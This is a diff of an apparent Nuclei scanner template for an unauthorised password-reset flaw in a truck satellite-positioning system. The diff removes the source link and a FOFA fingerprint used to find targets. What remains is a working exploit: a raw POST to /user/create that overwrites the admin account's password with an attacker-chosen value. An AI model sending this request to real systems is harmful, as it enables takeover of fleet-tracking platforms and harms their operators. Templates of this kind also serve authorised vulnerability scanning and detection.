@@ -3,12 +3,8 @@ info:
   name: 卡车卫星定位系统越权重置密码漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/htz0zo54ym3x4hug'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: htz0zo54ym3x4hug
-    fofa: icon_hash="1553867732"
 http:
 - raw:
   - 'POST /user/create HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Connection: close
-
-
 
 
     account=admin&id=1&password=dudesite12345&passwordRepeat=dudesite12345&groupName=111&roleid=5&validend=&phone=&email=&chncount=36&flowType=1&oldFlowType=&flowVal=&flowAlarmVal=&oldFlowAlarmVal=&logContent=111&guid=222&token=
